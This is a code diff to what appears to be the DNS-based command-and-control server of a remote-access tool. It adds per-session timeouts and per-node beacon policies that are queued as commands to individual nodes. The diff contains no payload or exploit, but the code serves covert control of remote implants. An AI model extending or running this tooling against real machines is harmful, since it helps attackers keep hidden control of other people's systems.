@@ -25,16 +25,25 @@ from ecpv import ECPV
 from threading import Thread, RLock, Event
 
 class Session(object):
-    def __init__(self, spi, encoder, commands):
+    def __init__(self, spi, encoder, commands, timeout):
         self.spi = spi
         self._start = time.time()
         self._encoder = encoder
         self._last_access = 0
+        self._timeout = timeout
         self.system_info = None
         self.commands = commands
         self.last_nonce = None
         self.last_qname = None
         self.cache = {}
+
+    @property
+    def timeout(self):
+        return ( self.idle > self._timeout )
+
+    @timeout.setter
+    def timeout(self, value):
+        self._timeout = value
 
     @property
     def idle(self):
@@ -206,19 +215,42 @@ class DnsCommandServerHandler(BaseResolver):
             ]
 
     @locked
-    def set_policy(self, kex=True, timeout=None, interval=None):
+    def set_policy(self, kex=True, timeout=None, interval=None, node=None):
         if kex == self.kex and self.timeout == timeout and self.interval == self.interval:
             return
 
         if interval and interval < 30:
             raise ValueError('Interval should not be less then 30s to avoid DNS storm')
 
-        self.interval = interval or self.interval
-        self.timeout = max(timeout if timeout else self.timeout, self.interval*3)
-        self.kex = kex if ( kex is not None ) else self.kex
+        if node and (interval or timeout):
+            session = self.find_sessions(
+                spi=node) or self.find_sessions(node=node)
 
-        cmd = Policy(self.interval, self.kex)
-        return self.add_command(cmd)
+            if session:
+                session = session[0]
+
+                if interval:
+                    session.timeout = (interval*3)
+                else:
+                    interval = self.interval
+
+                if timeout:
+                    session.timeout = timeout
+
+                if kex is None:
+                    kex = self.kex
+
+        else:
+            self.interval = interval or self.interval
+            self.timeout = max(timeout if timeout else self.timeout, self.interval*3)
+            self.kex = kex if ( kex is not None ) else self.kex
+
+            interval = self.interval
+            timeout = self.timeout
+            kex = self.kex
+
+        cmd = Policy(interval, kex)
+        return self.add_command(cmd, session=node)
 
     @locked
     def encode_pastelink_content(self, content):
@@ -333,7 +365,8 @@ class DnsCommandServerHandler(BaseResolver):
                     self.sessions[command.spi] = Session(
                         command.spi,
                         self.encoder.clone(),
-                        self.commands
+                        self.commands,
+                        self.timeout
                     )
 
                 encoder = self.sessions[command.spi].encoder
